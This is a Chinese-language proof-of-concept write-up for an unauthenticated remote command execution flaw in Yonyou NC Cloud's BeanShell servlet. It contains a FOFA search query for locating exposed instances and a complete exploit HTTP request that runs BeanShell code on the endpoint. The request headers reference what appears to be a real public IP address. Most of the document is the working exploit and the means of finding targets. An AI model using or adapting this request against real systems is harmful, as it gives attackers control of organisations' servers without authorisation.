# 用友NC Cloud存在前台远程命令执行漏洞

## 1.漏洞描述

用友 NC bsh.servlet.BshServlet 存在远程命令执行漏洞，该漏洞为远程命令执行漏洞，在无需登陆系统的情况下，攻击者可通过BeanShell测试接口（BeanShell可以直接执行java代码，适用于测试java代码的接口）直接执行任意命令，恶意攻击者成功利用该漏洞可获得目标系统管理权限。

## 2.搜索语法

```plain
fofa：app="用友-UFIDA-NC"
```

## 3.漏洞复现

```plain
POST /servlet/~ic/bsh.servlet.BshServlet HTTP/1.1
Host: 127.0.0.1
Content-Length:28
Cache-Control:max-age=0,
Upgrade-Insecure-Requests:1,
Origin:http://8.130.46.216:8082
Content-Type:application/x-www-form-urlencoded
User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko/125.0.0.0 Safari/537.36
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webapng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer:http://8.130.46.216:8082/servlet/~ic/bsh.servlet.BshServlet
Accept-Encoding:gzip, deflate
Accept-Language:zh-CN,zh;q=0.9
Cookie:JSESSIONID=BCFBABDCFCBF9D0D7C482AF1BDFEF70D.server
Connection:close

bsh.script=print("Hardog")
```

网站内容显示如下：
![image](https://github.com/hardog123/poc-exp/assets/170905460/e732b3d5-2141-4796-9f34-319959a56ad6)

